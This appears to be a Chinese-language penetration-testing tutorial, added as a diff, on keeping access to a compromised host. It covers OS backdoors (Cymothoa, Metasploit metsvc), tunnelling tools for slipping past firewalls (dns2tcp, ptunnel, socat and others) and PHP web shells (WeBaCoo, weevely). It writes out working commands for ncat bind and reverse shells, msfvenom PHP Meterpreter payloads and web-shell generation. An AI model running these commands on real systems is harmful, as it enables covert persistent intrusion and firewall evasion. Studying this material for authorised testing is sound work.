@@ -1,0 +1,157 @@
+维持控制权的程序可分为以下几类：
+- 操作系统后门
+- 隧道攻击
+- web后门
+---
+### 操作系统的后门
+- **Cymothoa**
+    Cymothoa是一款可用将shellcode注入到现有进程的后门工具。借助这个手段可以把shellcode伪装成常规程序。
+
+```
+cymothoa,在使用时必须通过-p选项指定目标进程的PID，通过-s选项指定shellcode的编号
+在渗透到目标主机后可把cymothoa的可执行程序复制到目标主机上，继而生成后门程序。
+
+# cymothoa -p 4255 -s 1 -y 4444   # 选定PID 4255为宿主进程，使用第一类shellcode，-y[port number]指定payload的服务端口
+
+用另一条主机，通过下述指令连接至目标主机后门（4255端口）
+# nc -nvv 192.168.45.102 4255
+```
+- **Intersect**
+    Intersect是一款适合在漏洞利用以后使用的能够自动完成多种后期任务的程序。它能够自动收集密码文件、复制SSH密钥、收集网络信息并能识别杀毒软件和防火墙程序。
+- **Meterpreter后门**
+    Metasploit meterpreter程序自带一个名为metsvc的后门程序，它可让您随时获取Meterpreter的shell。不过metsvc程序没有采用任何认证机制，所有发现该后门端口的人都能使用这个后门。
+```
+meterpreter > run metsvc    # 执行这个命令后，在被测主机上可找到此后门文件，并且当系统重启时会自动加载。
+meterpreter > run metsvc -r    # 在被测主机上卸载metsvc服务
+
+
+msf > use exploit/multi/handler     # 在攻击机上对目标进行利用
+msf exploit(multi/handler) > set payload windows/metsvc_bind_tcp
+payload => windows/metsvc_bind_tcp
+msf exploit(multi/handler) > show options
+```
+
+### 隧道工具
+
+在计算机领域里，隧道是指**使用某个网络协议封装另外一种网络协议**的技术手段。在渗透测试中，使用隧道技术主要是为了让目标系统的保护机制无法发挥作用。
+多数情况下，目标系统的防火墙会组织内部系统访问外部网络，只放行DNS、HTTP和HTTPS这类的常见网络协议。在这种情况下，如果要在目标系统的内网使用外网的其他网络协议，就需要构建HTTP协议的隧道。这样防火墙就会放行隧道封装的数据。
+
+- **dns2tcp**
+    dns2tcp是一种把tcp数据包伪装为dns协议数据包的隧道封装工具。它适用于目标主机只能发送dns请求的网络环境。当它在特定端口受理连接请求时，会封装成dns协议的格式，再发送到指定主机的指定端口的dns2tcp服务端程序。
+    dns2tcp采用了CS架构。客户端程序叫做dns2tcpc，服务端叫做dns2tcpd。
+- **iodine**
+    iodine是一款能够将IPv4的网络流量封装成DNS协议的工具。它特别适用于目标主机只能发送DNS请求的网络环境。
+- **ncat**
+    ncat是一款集发送、接收、转发、加密数据等多种功能为一身的网络工具。
+```
+用ncat设置主机为代理服务器：
+    root@kali:~# ncat -l -v --proxy-type http 192.168.72.130 8888
+    Ncat: Version 7.60 ( https://nmap.org/ncat )
+    Ncat: Listening on :::8888
+    Ncat: Listening on 0.0.0.0:8888
+
+ncat创建后门：
+    ncat -l -p 8899 -e /bin/bash            # 再被测主机上启用监听
+    ncat 192.168.32.134 8899                # 攻击机连接被测主机的backdoor
+
+创建reverse shell：
+    ncat -l -p 7788                         # 攻击机上开启端口
+    ncat 192.168.32.2 7788 -e /bin/bash     # 在被测主机上创建reverse shell，使其自主连接到攻击人员的主机上
+```
+应当注意，上述例子并没有对网络流量进行加密处理。如果需要加密网络数据，应当使用**cryptcat**程序。在使用cryptcat时，务必要在通信的两端使用-k选项设置加密密码，否则它将使用默认密码进行加密。
+
+- **proxychains**
+    proxychains程序可强制TCP客户端程序通过指定的代理服务器（或代理链）发起TCP连接。自3.1版本起，它支持SOCkS4代理、SOCKET5代理和基于CONNECT模式的HTTP代理服务器。
+```
+proxychains的文档介绍了它的各种用途：
+· 适用于通过代理服务器访问外部网络的情况
+· 可用于穿透限制外联端口的防火墙（出口过滤）
+· 可将2个（或更多）代理服务器组成代理服务器链
+· 可让本身不支持代理的程序使用代理服务器，如Telnet、Wget、FTP、VNC等
+· 可通过反响代理服务器从网络外部访问内网
+```
+- **ptunnel**
+    ptunnel是一款使用**ICMP** ping（请求和回复)封装TCP连接的隧道工具。即使被测主机无法向Internet发送任何TCP和UDP的数据，只要它可以向取Internet发起ping命令，那么这款工具就可以帮助它穿越防火墙。ptunnel可以脱离TCP和UDP连接访问E-mail、上网或进行其他网络活动。
+
+- **socat**
+    socat程序是一款使用两个独立数据通道（字节流）双向传输数据的中继程序。
+
+socat程序的工作流程分为4个阶段：
+
+    - 初始化阶段：在第一阶段，socat程序要解析命令行里的选项并初始化日志系统。
+    - 建立连接阶段：在第二阶段，socat程序会依次打开第一（源）地址和第二（目标）地址。因为必须先读后写，所以如果不能打开第一个地址，程序就会直接退出。
+    - 数据传输阶段：在第三阶段，socat程序通过select()函数监控两个数据通道的“读写”文件描述符。当数据源地址可读且目标可写时，socat会读取源数据。并在必要时进行转换符的转换，把元数据写到另外一个数据流里的目标文件描述符里，之后周而复始。
+    - 关闭连接阶段：当某个地址流遇到EOF，程序就进入了第四阶段。socat会在另外一个方向仍然在传输数据，那么程序将关闭所有的数据通道并停止执行。
+
+```
+要从主机192.168.2.22向主机192.168.2.23发送文件需要下面几步：
+
+1、 在192.168.2.23（接收端）执行下述指令：
+    socat TCP4-LISTEN:12345 OPEN:php-meter.php, create, append      # socat会监听12345端口，如果没有php-meter.php这个文件会创建该文件，否则会将传输内容续写到文件的尾部
+2、 在主机192.168.2.22发送端上执行下述指令：
+    cat php-meter.php | socat - TCP4:192.168.2.23:12345
+```
+- **sslh**
+    sslh是SSL/SSH协议的端口复用程序。它在指定端口受理连接，然后根据远程客户端发送的第一个数据包识别应用程序的连接类型，并将之转发到相应的服务端程序。
+```
+sslh程序的端口复用功能可在443端口上同时受理SSH连接和HTTPS连接：
+
+1、在启动sslh程序之前，要先对web服务器端程序进行调整。您需要首先编辑服务器程序的配置文件，使其仅监听本机（localhost）的443端口。然后重启web服务器端程序。
+2、接下来配置sslh，打开文件/etc/default/sslh，并将 Run=no 替换为 Run=yes。保存并启动sslh
+
+之后便可以使用另一台主机通过443端口连接到被测主机的SSH服务。
+ssh -p 443 root@192.168.2.22
+```
+- **stunnel4**
+    stunnel4可以使用**SSL**技术对客户端和服务器端之间的TCP会话进行**加密传输**。stunnel4可以为本身无法进行TLS或SSL通信的客户端及服务器程序提供安全的加密连接，而不必修改这些程序的源代码。它可封装Samba、POP3、IMAP、SMTP和HTTP协议。
+
+### Web后门
+
+- **WeBaCoo**  
+    Web Backdoor Cookie是一款隐蔽的脚本类Web后门工具。借助http协议，它可在客户端和Web服务器之间实现执行代码的网页终端。
+
+    WebBaCoo有两种操作模式：
+    - Generation（生产线模式）：指定-g选项可进入这种模式。用户可在这种模式下制作PHP代码的payload
+    - Terminal（终端模式）：    指定-t选项可进入这种模式。用户可在这种模式下连接到被测主机的后门程序
+
+    WeBaCoo的精妙在于web服务器和客户端之间的通信载体是cookie。这就意味着多数的杀毒软件、网络入侵检测/防御系统、网络防火墙和应用程序防火墙都无法检测到后门的存在。
+    在WeBaCoo的HTTP Cookie中，以下三个参数的作用最为重要：
+    - cm：以base64编码的shell指令
+    - cn：加载着编码后输出内容的cookie名称
+    - cp：封装编码后输出内容的分隔符
+```
+root@kali:~# webacoo -g -o backdoor.php                 # 生成后门php
+
+	WeBaCoo 0.2.3 - Web Backdoor Cookie Script-Kit
+	Copyright (C) 2011-2012 Anestis Bechtsoudis
+	{ @anestisb | anestis@bechtsoudis.com | http(s)://bechtsoudis.com }
+
+[+] Backdoor file "backdoor.php" created.
+
+把这个backdoor.php上传至被测主机（192.168.2.23）
+接下来就可以使用以下指令连接到被测主机的后门程序：
+root@kali:~# webacoo -t -u http://www.test.com/backdoor.php
+
+```
+- **weevely**
+weevely是一款具有高隐蔽性的针对PHP平台的web shell。它实现了SSH风格的终端界面，并有大量自动化的模块。测试人员可用它执行系统指令、远程管理和渗透后期的自动渗透。
+
+它有30多种可完成自动管理渗透后期任务的功能模块。这些模块能够：
+    - 执行命令和浏览远程文件系统
+    - 检测常见的服务器配置问题
+    - 创建TCP shell和reverse shell
+    - 在被测主机上安装HTTP代理
+    - 利用目标主机进行端口扫描
+```
+# weevely generate password backdoor.php            # 生成后门，放入目标站点
+
+# weevely http://192.168.2.22/backdoor.php password # 攻击机连接
+```
+
+### PHP Meterpreter
+Metasploit有一个名为PHP Meterpreter的payload。这个模块可创建具有Meterpreter功能的PHP Web shell。利用目标的漏洞（诸如常见的注入和上传漏洞）后，再把它的shell传到目标主机上即可
+
+Metasploit的msfvenom工具可制作PHP meterpreter，具体如下：
+```
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.2.23 -f raw > php-meter.php
+```
